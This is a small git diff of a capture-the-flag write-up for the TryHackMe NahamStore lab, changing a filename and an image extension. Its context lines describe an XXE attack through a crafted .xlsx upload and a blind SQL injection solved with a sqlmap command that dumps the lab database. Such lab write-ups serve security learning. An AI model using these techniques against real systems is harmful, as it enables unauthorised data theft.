@@ -329,7 +329,7 @@ Here we will exploit `XXE file upload` at `/staff`. There is a good source [here
 First, create a normal `.xlsx` file and then unzip it
 ```
 mkdir test && cd test 
-unzip ../my.xlsx
+unzip ../sample.xlsx
 ```
 Then modify `xl/workbook.xml` file to this:
 ```xml
@@ -390,7 +390,7 @@ Table: sqli_one
 
 ### Flag 2
 This blind SQli require you to download the packet, capture `POST /erturns`
-![alt text](/assets/img/tryhackme/nahamStore/sqli.png)
+![alt text](/assets/img/tryhackme/nahamStore/sqli.PNG)
 And the download it and save it as `capture`, now we can use `sqlmap` to get data
 ```
 sqlmap -r capture --dbms='MySQL' -D nahamstore --dump --threads 10
